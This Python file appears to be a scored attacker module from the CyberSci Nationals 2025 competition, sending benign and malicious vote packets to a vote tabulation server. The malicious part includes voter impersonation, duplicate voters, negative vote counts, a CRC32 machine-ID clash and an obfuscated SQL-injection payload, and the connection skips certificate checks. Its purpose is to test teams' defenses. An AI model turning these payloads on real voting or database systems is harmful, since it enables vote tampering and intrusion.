#!/usr/bin/env python3
#
# CyberSci Nationals 2025
#
# Dmitriy Beryoza (0xd13a@gmail.com)
#
# Attacker for Vote Tabulation Server
#

import binascii
import string
import ssl 
import socket
import struct
import traceback
import random
from siege.attacker.attacker import Attacker
from siege.core.attack_result import AttackResult
from siege.core.log import log, log_error

SOCK_TIMEOUT = 5

VOTERS = "./voter-list.csv"
CANDIDATES = "./candidates.csv"
MACHINES = "./machine-ids.csv"
CLASHES = "./machine-id-clashes.csv"
BAD_VOTERS = "./bad-voter-list.csv"
BAD_MACHINES = "./bad-machine-ids.csv"

class VTSAttacker(Attacker):

    machine_id:str = None
    votes = []

    machines = []
    voters = {}
    clashes = {}
    candidates = {}
    bad_machines = []
    bad_voters = {}

    def __init__(self, host, port):
        """ Initialize attacker. """
        super().__init__(host, port)
        self.load_data()

    def send(self, data:bytes) -> AttackResult:
        """ Send byte array to the destination, receive response. """
        result = ""

        #log("VTSAttacker sending packet: {}".format(binascii.hexlify(data).decode('ascii')))

        try:
            context = ssl._create_unverified_context()

            with socket.create_connection((self.host, self.port), timeout=SOCK_TIMEOUT) as sock:
                with context.wrap_socket(sock, server_hostname=self.host) as ssock:
                    ssock.sendall(data)
                    result = ssock.recv(10)
        except Exception as e:
            log_error("VTSAttacker connect and send failure : {}".format(traceback.format_exc()))
            return AttackResult.RESULT_DOWN
        
        log("VTSAttacker returned value: {}".format(binascii.hexlify(result).decode('ascii')))
        if len(result) != 1 or result[0] != 1:
            return AttackResult.RESULT_FAILURE
        return AttackResult.RESULT_SUCCESS
    
    def load_data(self) -> None:
        """ Load voter, machine, candidate data. """
        self.bad_voters = {}
        with open(BAD_VOTERS, "r") as file:
            for line in file.readlines():
                id,name = line.strip().split(",")
                self.bad_voters[name] = int(id)

        self.bad_machines = []
        with open(BAD_MACHINES, "r") as file:
            for line in file.readlines():
                id = line.strip()
                self.bad_machines.append(id)

        self.machines = []
        with open(MACHINES, "r") as file:
            for line in file.readlines():
                id = line.strip()
                self.machines.append(id)

        self.candidates = {}
        with open(CANDIDATES, "r") as file:
            for line in file.readlines():
                id, name = line.strip().split(",")
                self.candidates[int(id)] = name

        self.voters = {}
        with open(VOTERS, "r") as file:
            for line in file.readlines():
                id, name = line.strip().split(",")
                self.voters[name] = int(id)

        self.clashes = {}
        with open(CLASHES, "r") as file:
            for line in file.readlines():
                _, id, clash = line.strip().split(",")
                self.clashes[id] = clash


    def gen_base_vote_result(self) -> None:
        """ Create random vote result. """
        self.machine_id = random.choice(self.machines)
        self.votes = []
        num = random.randint(10, 100)
        shuffled_voters = random.sample(list(self.voters.keys()), k=num)
        for v in shuffled_voters:
            candidate = random.choice(list(self.candidates.keys()))
            self.votes.append((candidate, self.candidates[candidate], self.voters[v], v, 1))


    def send_payload(self) -> AttackResult:
        """ Encode and send vote result. """
        payload = self.machine_id.zfill(16).encode("utf-8")

        payload += struct.pack("b", len(self.votes))

        for v in self.votes:
            payload += struct.pack("b", v[0])
            payload += struct.pack("b", len(v[1]))
            payload += v[1].encode("utf-8")
            payload += struct.pack("<I", v[2])
            payload += struct.pack("b", len(v[3]))
            payload += v[3].encode("utf-8")
            payload += struct.pack("b", v[4])

        return self.send(payload)
    
    def reverse_result(self, result: AttackResult) -> AttackResult:
        """ Reverse response error codes to report 'negative' tests as benign (where server correctly rejects known bad votes). """
        if result == AttackResult.RESULT_SUCCESS:
            return AttackResult.RESULT_FAILURE
        if result == AttackResult.RESULT_FAILURE:
            return AttackResult.RESULT_SUCCESS
        return result

    def good_votes(self) -> AttackResult:
        """ Send good votes. """
        self.gen_base_vote_result()

        return self.send_payload()

    def unknown_machine_handled(self) -> AttackResult:
        """ Send bad machine ID (will be rejected). """
        self.gen_base_vote_result()

        self.machine_id = random.choice(self.bad_machines)
        log("VTSAttacker bad machine ID: {}".format(self.machine_id))

        return self.reverse_result(self.send_payload())

    def unknown_voter_handled(self) -> AttackResult:
        """ Send unknown voter (will be rejected). """
        self.gen_base_vote_result()

        rand_idx = random.randint(0,len(self.votes)-1)
        vote = self.votes[rand_idx]
        bad_voter = random.choice(list(self.bad_voters.keys()))
        self.votes[rand_idx] = (vote[0],vote[1],self.bad_voters[bad_voter],bad_voter,vote[4])
        log("VTSAttacker bad voter: {} {} {}".format(rand_idx, self.bad_voters[bad_voter], bad_voter))

        return self.reverse_result(self.send_payload())

    def bad_vote_count_handled(self) -> AttackResult:
        """ Send more than one vote count per person (will be rejected). """
        self.gen_base_vote_result()

        rand_idx = random.randint(0,len(self.votes)-1)
        vote = self.votes[rand_idx]
        self.votes[rand_idx] = (vote[0],vote[1],vote[2],vote[3],random.randint(2,100))
        log("VTSAttacker bad vote count handled: {} {}".format(rand_idx, self.votes[rand_idx][4]))

        return self.reverse_result(self.send_payload())

    def device_clash(self) -> AttackResult:
        """ Send voting machine with the ID that is a known CRC32 clash. """
        self.gen_base_vote_result()

        clashing_id = random.choice(list(self.clashes.keys()))
        self.machine_id = self.clashes[clashing_id]
        log("VTSAttacker clashing device ID: {}".format(self.machine_id))

        return self.send_payload()

    def voter_impersonation(self) -> AttackResult:
        """ Impersonate voter by name. """
        self.gen_base_vote_result()

        rand_idx = random.randint(0,len(self.votes)-1)
        vote = self.votes[rand_idx]

        random_bad_voter = random.choice(list(self.bad_voters.keys()))
        bad_id = self.bad_voters[random_bad_voter]

        self.votes[rand_idx] = (vote[0],vote[1],bad_id,vote[3],vote[4])
        log("VTSAttacker voter impersonation: {} {}".format(rand_idx, bad_id))

        return self.send_payload()

    def duplicate_voter(self) -> AttackResult:
        """ Duplicate voter record. """
        self.gen_base_vote_result()

        rand_src_idx = random.randint(0,len(self.votes)-1)
        rand_dst_idx = random.randint(0,len(self.votes)-1)

        while rand_dst_idx == rand_src_idx:
            rand_dst_idx = random.randint(0,len(self.votes)-1)

        dst_vote = self.votes[rand_dst_idx]
        src_vote = self.votes[rand_src_idx]
        self.votes[rand_dst_idx] = (dst_vote[0],dst_vote[1],src_vote[2],src_vote[3],dst_vote[4])
        log("VTSAttacker duplicate voter: {} {} {}".format(rand_dst_idx, src_vote[2],src_vote[3]))

        return self.send_payload()

    def negative_vote_count(self) -> AttackResult:
        """ Send negative vote count. """
        self.gen_base_vote_result()

        rand_idx = random.randint(0,len(self.votes)-1)
        vote = self.votes[rand_idx]
        self.votes[rand_idx] = (vote[0],vote[1],vote[2],vote[3],random.randint(-100,-1))
        log("VTSAttacker bad vote count: {} {}".format(rand_idx, self.votes[rand_idx][4]))

        return self.send_payload()

    def sqli(self) -> AttackResult:
        """ Send SQLi. """
        self.gen_base_vote_result()

        rand_idx = random.randint(0,len(self.votes)-1)
        vote = self.votes[rand_idx]

        comment1 = "/*" + ''.join(random.choices(string.ascii_letters + string.digits + " ", k=random.randint(0,10))) + "*/"
        comment2 = "/*" + ''.join(random.choices(string.ascii_letters + string.digits + " ", k=random.randint(0,10))) + "*/"
        space1 = ''.join(random.choices(" ", k=random.randint(0,10)))
        space2 = ''.join(random.choices(" ", k=random.randint(0,10)))

        sqli_payload = "'"
        sqli_payload += random.choice([comment1,space1])
        sqli_payload += random.choice(['O','o']) + random.choice(['R','r'])
        sqli_payload += random.choice([comment2,space2])
        sqli_payload += "'"
        sqli_payload += str(random.randint(1,10000))
        self.votes[rand_idx] = (vote[0],vote[1] + sqli_payload,vote[2],vote[3],vote[4])
        log("VTSAttacker SQLi: {} {}".format(rand_idx, sqli_payload))

        return self.send_payload()

    def benign_request(self, id: int, tick: int, sequence_no: int) -> AttackResult:
        """ Send benign requests. """
        try:
            if id == 1 or id == 2:
                return self.good_votes()
            elif id == 3:
                return self.unknown_machine_handled()
            elif id == 4:
                return self.unknown_voter_handled()
            elif id == 5:
                return self.bad_vote_count_handled()
        except BaseException as e:
            log_error("VTSAttacker benign request {} tick {} error: {}".format(id, tick, traceback.format_exc()))
            return AttackResult.RESULT_DOWN
        raise Exception("Unknown request type '{}'".format(id)) 
        
    def malicious_request(self, id: int, tick: int, sequence_no: int) -> AttackResult:
        """ Send malicious requests. """
        try:
            if id == 1:
                return self.voter_impersonation()
            elif id == 2:
                return self.sqli()       
            elif id == 3:
                return self.device_clash()
            elif id == 4:
                return self.duplicate_voter()
            elif id == 5:
                return self.negative_vote_count()
        except BaseException as e:
            log_error("VTSAttacker malicious request {} tick {} error: {}".format(id, tick, traceback.format_exc()))
            return AttackResult.RESULT_DOWN
        raise Exception("Unknown request type '{}'".format(id)) 